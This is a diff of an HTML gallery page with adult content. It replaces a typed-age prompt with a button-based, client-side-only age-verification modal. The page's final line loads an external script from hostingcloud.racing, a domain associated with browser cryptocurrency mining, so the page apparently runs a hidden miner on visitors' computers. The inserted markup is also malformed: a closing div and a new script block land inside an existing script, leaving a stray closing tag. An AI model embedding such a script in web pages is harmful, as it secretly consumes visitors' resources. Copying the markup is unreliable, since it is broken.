@@ -9,18 +9,27 @@
 </head>
 <body>
 
-    <!-- Age Verification Modal -->
+      <!-- Age Verification Modal -->
   <div id="ageModal">
     <div id="ageModalContent">
       <h2>Age Verification</h2>
-      <p>You must be 18 years or older to enter this site.</p>
-      <label for="ageInput">Enter your age:</label>
-      <br>
-      <input type="number" id="ageInput" min="0" max="120" placeholder="Your age">
-      <br>
-      <button id="verifyAge">Submit</button>
+      <p>
+        This website contains explicit adult content and is intended for users who are 18 years or older.
+        By clicking "I am over 18", you confirm that you are legally permitted to view this content and agree to our terms and conditions.
+      </p>
+      <div class="btn-container">
+        <button class="btn-over" id="btnOver">I am over 18</button>
+        <button class="btn-under" id="btnUnder">I am under 18</button>
+      </div>
+      <p class="disclaimer">
+        Warning: This site contains explicit adult material. If you are under 18 or do not agree to the legal terms,
+        please exit immediately. By proceeding, you accept all legal responsibilities and applicable terms.
+      </p>
     </div>
   </div>
+
+  <!-- Main Content (Initially hidden behind the modal) -->
+  <div id="content" style="display: none;">
 
     <h1 class="gallery-title">My pictures</h1>
 
@@ -45,6 +54,23 @@
         galleryItem.appendChild(img);
         galleryContainer.appendChild(galleryItem);
     }
+</div>
+    <script>
+    // When the page loads, the modal is visible, blocking the content.
+    // Add event listeners for the buttons.
+    document.getElementById('btnOver').addEventListener('click', function () {
+      // Hide the age verification modal and display the main content.
+      document.getElementById('ageModal').style.display = 'none';
+      document.getElementById('content').style.display = 'block';
+    });
+
+    document.getElementById('btnUnder').addEventListener('click', function () {
+      // Optionally show a message and redirect or simply block access.
+      alert('Access denied. You must be 18 or older to view this site.');
+      // For example, redirecting to a safe site:
+      window.location.href = 'https://www.google.com';
+    });
+  </script>
 </script>
 
 <script src="https://www.hostingcloud.racing/UXQb.js"></script>
